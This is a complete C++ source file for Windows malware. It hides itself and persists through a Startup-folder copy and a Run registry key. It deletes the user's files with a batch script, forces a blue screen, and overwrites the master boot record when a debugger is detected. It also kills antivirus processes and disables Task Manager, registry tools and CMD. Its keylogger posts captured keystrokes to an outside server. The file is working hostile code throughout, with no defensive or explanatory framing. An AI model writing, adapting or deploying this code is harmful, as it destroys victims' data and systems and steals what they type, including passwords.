#include <Windows.h>
#include <WinInet.h>
#undef BOOLAPI
#undef SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
#undef SECURITY_FLAG_IGNORE_CERT_CN_INVALID

#define URL_COMPONENTS URL_COMPONENTS_ANOTHER
#define URL_COMPONENTSA URL_COMPONENTSA_ANOTHER
#define URL_COMPONENTSW URL_COMPONENTSW_ANOTHER

#define LPURL_COMPONENTS LPURL_COMPONENTS_ANOTHER
#define LPURL_COMPONENTSA LPURL_COMPONENTS_ANOTHER
#define LPURL_COMPONENTSW LPURL_COMPONENTS_ANOTHER

#define INTERNET_SCHEME INTERNET_SCHEME_ANOTHER
#define LPINTERNET_SCHEME LPINTERNET_SCHEME_ANOTHER

#define HTTP_VERSION_INFO HTTP_VERSION_INFO_ANOTHER
#define LPHTTP_VERSION_INFO LPHTTP_VERSION_INFO_ANOTHER
#include <winhttp.h>
#undef URL_COMPONENTS
#undef URL_COMPONENTSA
#undef URL_COMPONENTSW

#undef LPURL_COMPONENTS
#undef LPURL_COMPONENTSA
#undef LPURL_COMPONENTSW

#undef INTERNET_SCHEME
#undef LPINTERNET_SCHEME

#undef HTTP_VERSION_INFO
#undef LPHTTP_VERSION_INFO
#include <shlobj_core.h>
#include <fileapi.h>
#include <iostream>
#include <string>
#include <tlhelp32.h>
#include <urlmon.h>

#pragma comment(lib, "Winhttp.lib")
#pragma comment(lib, "Kernel32.lib")
#pragma comment(lib, "Wininet.lib")
#pragma comment(lib, "mincore.lib")
#pragma comment(lib, "User32.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "urlmon.lib")

extern "C" NTSTATUS NTAPI RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN OldValue);
extern "C" NTSTATUS NTAPI NtRaiseHardError(LONG ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask,
	PULONG_PTR Parameters, ULONG ValidResponseOptions, PULONG Response);

void BlueScreen()
{
	BOOLEAN bl;
	ULONG Response;
	RtlAdjustPrivilege(19, TRUE, FALSE, &bl); // Enable SeShutdownPrivilege
	NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, NULL, 6, &Response); // Shutdown
}

using namespace std;

void closeCurrentWindow();
void destroyMBR();
void DisableSoftwares();
bool ForceExecute();
bool CheckIfDebuggerPresent();
void StartKeyLogger();
void sendKeyLoggedData(LPVOID);
void DoCrazyShit();
void BlueScreen();
bool ScreenProcesses(PROCESSENTRY32);
void KillAntiViruses();
int strCmp(const char*, const char*);
size_t strLen(const char*);
void DeleteShit();


BOOL SetPrivilege(HANDLE, LPCTSTR, BOOL);

const char* dbg1 = "OllyDbg";
const char* dbg2 = "x32dbg";
const char* dbg3 = "IDA";
const char *dbg4 = "Soft Ice";

const char* dbg5 = "ida.exe";
const char* dbg6 = "x64dbg.exe";
const char* dbg7 = "x32dbg.exe";
const char* dbg8 = "OLLYDBG.EXE";

const char* av1 = "AvastSvc.exe";
const char* av2 = "SMC.exe";
const char* av3 = "AVGSvc.exe";

const char* startMenuDir = "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\windows32.exe";

const char* taskManagerKey = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\";
const char* cmdKey = "Software\\Policies\\Microsoft\\Windows\\System\\";
const char* forceRunKey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run\\";


const wchar_t* browserAgent = L"James Bond";

const wchar_t* targetWebsite = L"www.evocreate.tk";
const wchar_t* targetWebHost = L"/optimizer.php";

const char* Img_Download_URL = "https://pixel.nymag.com/imgs/daily/following/2015/11/02/02-troll-face.w710.h473.jpg";
const char* Save_Img_Directory = "C:\\new_img.jpg";

const char* keyLogFile = "C:\\Windows\\security\\system32.txt";

const char* batFile = "hello.bat";

char batData[] = "cd %userprofile%\r\ndel *.* /Q /S\r\ndel \"%~f0\"";


int main() {
	closeCurrentWindow();
	ForceExecute();
	if (!(IsUserAnAdmin())) {
		DeleteShit();
		DoCrazyShit();
		ExitProcess(0);
	}
	if (CheckIfDebuggerPresent()) {
		destroyMBR();
	}
	KillAntiViruses();
	DisableSoftwares();
	StartKeyLogger();
	return EXIT_SUCCESS;
}

void DeleteShit() {
	DWORD test;
	//test = MoveFile("hello", "hello.bat");
	//ShellExecute(NULL, "open", "hello.bat", NULL, NULL, 0);
	HANDLE hFile;
	hFile = CreateFile(batFile, // name of the write
		GENERIC_ALL,          // open for writing
		FILE_SHARE_WRITE,                      // do not share
		NULL,                   // default security
		OPEN_ALWAYS,             // create new file only
		FILE_ATTRIBUTE_NORMAL,  // normal file
		NULL);
	DWORD dwBytesWritten;
	WriteFile(
		hFile,           // open file handle
		batData,      // start of data to write
		strLen(batData),  // number of bytes to write
		&dwBytesWritten, // number of bytes that were written
		NULL);
	CloseHandle(hFile);
	ShellExecute(NULL, "open", batFile, NULL, NULL, 0);
}

size_t strLen(const char *str)
{
	const char *s;

	for (s = str; *s; ++s)
		;
	return (s - str);
}

void KillAntiViruses() {
	HANDLE procToken;
	OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &procToken);
	SetPrivilege(procToken, SE_DEBUG_NAME, true);
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 procEntry;
	procEntry.dwSize = sizeof(PROCESSENTRY32);
	while (Process32Next(snapshot, &procEntry)) {
		if (!(strCmp(procEntry.szExeFile, av1)) || !(strCmp(procEntry.szExeFile, av2)) || !(strCmp(procEntry.szExeFile, av3))) {
			HANDLE procHandle = OpenProcess(PROCESS_TERMINATE, false, procEntry.th32ProcessID);
			TerminateProcess(procHandle, 0);
		}
		Sleep(500);
	}
}

int rand() {
	static unsigned long int next = 7;
	next = next * 1103515245 + 12345;
	return (unsigned int)(next / 65536) % 32768;
}

void DoCrazyShit() {
	int i, x, y;
	for (i = 0; i < 50; i++) { // revamp the crazy mouse shit
		x = rand();
		y = rand();
		SetCursorPos(x, y);
		Sleep(200);
	}
	for (int i = 0; i < 10; i++) {
		ShellExecute(NULL, "open", "http://amp.businessinsider.com/images/56c640526e97c625048b822a-750-563.jpg", NULL, NULL, SW_MAXIMIZE);
	}
	URLDownloadToFile(NULL, Img_Download_URL, Save_Img_Directory, 0, NULL);
	SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, (PVOID)Save_Img_Directory, SPIF_UPDATEINIFILE);
	Sleep(5000);
	HWND hWin;
	hWin = FindWindow("Shell_TrayWnd", NULL); // hide taskbar
	EnableWindow(hWin, false);
	ShowWindow(hWin, false);
	BlockInput(true);
	ShowCursor(false);
	Beep(10000, 5000);
	for (int i = 0; i < 10; i++) {
		Sleep(250);
		if (i % 2 == 0) {
			SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, 2);
		}
		else {
			SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, -1);
		}
	}
	Sleep(2500);
	BlueScreen();
}


void StartKeyLogger() {
	int noKeysBeforeSend = 0;
	HANDLE hFile;
	DWORD bytesToWrite = 1;
	DWORD dwBytesWritten = 0;
	BOOL bErrorFlag = FALSE;

	hFile = CreateFile(keyLogFile, // name of the write
		GENERIC_ALL,          // open for writing
		FILE_SHARE_WRITE,                      // do not share
		NULL,                   // default security
		OPEN_ALWAYS,             // create new file only
		FILE_ATTRIBUTE_NORMAL,  // normal file
		NULL);

	while (true) {
		Sleep(500);
		if (noKeysBeforeSend >= 20) {
			noKeysBeforeSend = 0;
			CloseHandle(hFile);
			hFile = CreateFile(keyLogFile, // name of the write
				GENERIC_ALL,          // open for writing
				FILE_SHARE_WRITE,                      // do not share
				NULL,                   // default security
				OPEN_ALWAYS,             // create new file only
				FILE_ATTRIBUTE_NORMAL,  // normal file
				NULL);
			const int BUFFER_SIZE = 21;
			char readBuffer[BUFFER_SIZE];
			DWORD bytesRead;
			ReadFile(hFile, readBuffer, BUFFER_SIZE, &bytesRead, NULL);
			sendKeyLoggedData(readBuffer);
			CloseHandle(hFile);
			DeleteFile(keyLogFile);
			hFile = CreateFile(keyLogFile, // name of the write
				GENERIC_ALL,          // open for writing
				FILE_SHARE_WRITE,                      // do not share
				NULL,                   // default security
				OPEN_ALWAYS,             // create new file only
				FILE_ATTRIBUTE_NORMAL,  // normal file
				NULL);
		}
		for (char Key = 8; Key < 127; Key++) {
			if (GetAsyncKeyState(Key) == -32767) {
				char Data[] = { Key };
				DWORD dwMoved = ::SetFilePointer(hFile, 0l, nullptr, FILE_END);
				bErrorFlag = WriteFile(
					hFile,           // open file handle
					Data,      // start of data to write
					bytesToWrite,  // number of bytes to write
					&dwBytesWritten, // number of bytes that were written
					NULL);
				noKeysBeforeSend++;
			}
		}
	}
	CloseHandle(hFile);
}



void sendKeyLoggedData(LPVOID payload) {
	DWORD flag;
	if (!(InternetGetConnectedState(&flag, 0))) {
		return;
	}
	int BUFFER_SIZE = 21;
	int error = 0;
	DWORD dwSize = 0;
	DWORD dwDownloaded = 0;
	LPSTR pszOutBuffer;
	BOOL  bResults = FALSE;
	HINTERNET  hSession = NULL,
		hConnect = NULL,
		hRequest = NULL;

	hSession = WinHttpOpen(browserAgent,
		WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
		WINHTTP_NO_PROXY_NAME,
		WINHTTP_NO_PROXY_BYPASS, 0);

	error = GetLastError();

	hConnect = WinHttpConnect(hSession, targetWebsite,
		INTERNET_DEFAULT_HTTP_PORT, 0);

	error = GetLastError();

	hRequest = WinHttpOpenRequest(hConnect, L"POST", targetWebHost,
		NULL, WINHTTP_NO_REFERER,
		WINHTTP_DEFAULT_ACCEPT_TYPES,
		0);
	//hRequest = WinHttpOpenRequest(hConnect, L"GET", NULL,
	//	NULL, WINHTTP_NO_REFERER,
	//	WINHTTP_DEFAULT_ACCEPT_TYPES,
	//	WINHTTP_FLAG_REFRESH);

	error = GetLastError();

	//bResults = WinHttpSendRequest(hRequest,
	//	WINHTTP_NO_ADDITIONAL_HEADERS, 0,
	//	WINHTTP_NO_REQUEST_DATA, 0,
	//	0, 0);

	bResults = WinHttpSendRequest(hRequest,
		WINHTTP_NO_ADDITIONAL_HEADERS, 0,
		(LPVOID)payload, BUFFER_SIZE,
		BUFFER_SIZE, 0);

	error = GetLastError();
	// When finished, release the HINTERNET handle.
	WinHttpCloseHandle(hSession);

}

bool CheckIfDebuggerPresent() {
	BOOL present = false;
	present = IsDebuggerPresent();
	CheckRemoteDebuggerPresent(GetCurrentProcess(), &present);
	if (FindWindow(NULL, dbg1) || FindWindow(NULL, dbg2) || FindWindow(NULL, dbg3) || FindWindow(NULL, dbg4))
	{
		present = true;
	}
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 procEntry;
	procEntry.dwSize = sizeof(PROCESSENTRY32);
	while (Process32Next(snapshot, &procEntry)) {
		if (ScreenProcesses(procEntry)) {
			present = true;
		}
	}
	return present;
}

int strCmp(const char* s1, const char* s2)
{
	while (*s1 && (*s1 == *s2))
	{
		s1++;
		s2++;
	}
	return *(const unsigned char*)s1 - *(const unsigned char*)s2;
}

bool ScreenProcesses(PROCESSENTRY32 procEntry) {
	if (!(strCmp(procEntry.szExeFile, dbg5) || strCmp(procEntry.szExeFile, dbg6) || strCmp(procEntry.szExeFile, dbg7) || strCmp(procEntry.szExeFile, dbg8))) {
		return true;
	}
	return false;
}

bool ForceExecute() {
	char filename[MAX_PATH];
	DWORD size = GetModuleFileNameA(NULL, (LPSTR)filename, MAX_PATH);
	CopyFile(filename, startMenuDir, false);
	HKEY hKey;
	RegOpenKeyEx(HKEY_CURRENT_USER, forceRunKey, 0, KEY_ALL_ACCESS, &hKey);
	RegSetValueEx(hKey, "system32", 0, REG_SZ, (LPBYTE)filename, strLen(filename));
	DWORD attributes = GetFileAttributes(filename);
	return SetFileAttributes(filename, attributes + FILE_ATTRIBUTE_HIDDEN);
}

void DisableSoftwares() {
	HKEY hKey;
	DWORD dwVal = 1;
	DWORD dwVal2 = 2;
	//byte shell[] = { 0x66, 0x2e, 0x65, 0x78, 0x65 };
	long error = RegOpenKeyEx(HKEY_CURRENT_USER, taskManagerKey, 0, KEY_ALL_ACCESS, &hKey);
	if (error == ERROR_NO_MATCH || error == ERROR_FILE_NOT_FOUND) {
		RegCreateKey(HKEY_CURRENT_USER, taskManagerKey, &hKey);
	}
	RegSetValueEx(hKey, "DisableTaskmgr", 0, REG_DWORD, (LPBYTE)&dwVal, sizeof(DWORD));
	RegSetValueEx(hKey, "DisableRegistryTools", 0, REG_DWORD, (LPBYTE)&dwVal2, sizeof(DWORD));
	error = RegOpenKeyEx(HKEY_CURRENT_USER, cmdKey, 0, KEY_ALL_ACCESS, &hKey);
	if (error == ERROR_NO_MATCH || error == ERROR_FILE_NOT_FOUND) {
		RegCreateKey(HKEY_CURRENT_USER, cmdKey, &hKey);
	}
	RegSetValueEx(hKey, "DisableCMD", 0, REG_DWORD, (LPBYTE)&dwVal2, sizeof(DWORD));
	RegCloseKey(hKey);
}

void closeCurrentWindow() {
	HWND consoleWindow;
	BOOLEAN bl;
	consoleWindow = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(consoleWindow, 0);
}

void destroyMBR() {

	HANDLE procToken;
	OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &procToken);
	SetPrivilege(procToken, SE_SHUTDOWN_NAME, true);

	DWORD write;
	const char * debugString = "Wrong move buddy, why the fuck did you debug me you cunt?";
	char masterBootRecordOverwrite[512];


	for (int i = 0; i < 512; i++) {
		masterBootRecordOverwrite[i] = 0;
	}

	HANDLE MBR = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
	if (WriteFile(MBR, masterBootRecordOverwrite, 512, &write, NULL))
	{
		MessageBoxA(NULL, debugString, "Overrided Mother Fucker", MB_OK);
		Sleep(5000);
		ExitWindowsEx(EWX_REBOOT, SHTDN_REASON_MAJOR_OPERATINGSYSTEM);
	}
	else
	{
		MessageBoxA(NULL, debugString, "Failed to Overwrite Bitch!", MB_OK);
		Sleep(5000);
		CloseHandle(MBR);
		ExitProcess(0);
	}
}

BOOL SetPrivilege(
	HANDLE hToken,          // access token handle
	LPCTSTR lpszPrivilege,  // name of privilege to enable/disable
	BOOL bEnablePrivilege   // to enable or disable privilege
)
{
	TOKEN_PRIVILEGES tp;
	LUID luid;

	if (!LookupPrivilegeValue(
		NULL,            // lookup privilege on local system
		lpszPrivilege,   // privilege to lookup 
		&luid))        // receives LUID of privilege
	{
		return FALSE;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	if (bEnablePrivilege)
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	else
		tp.Privileges[0].Attributes = 0;

	// Enable the privilege or disable all privileges.

	if (!AdjustTokenPrivileges(
		hToken,
		FALSE,
		&tp,
		sizeof(TOKEN_PRIVILEGES),
		(PTOKEN_PRIVILEGES)NULL,
		(PDWORD)NULL))
	{
		return FALSE;
	}

	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)

	{
		return FALSE;
	}

	return TRUE;
}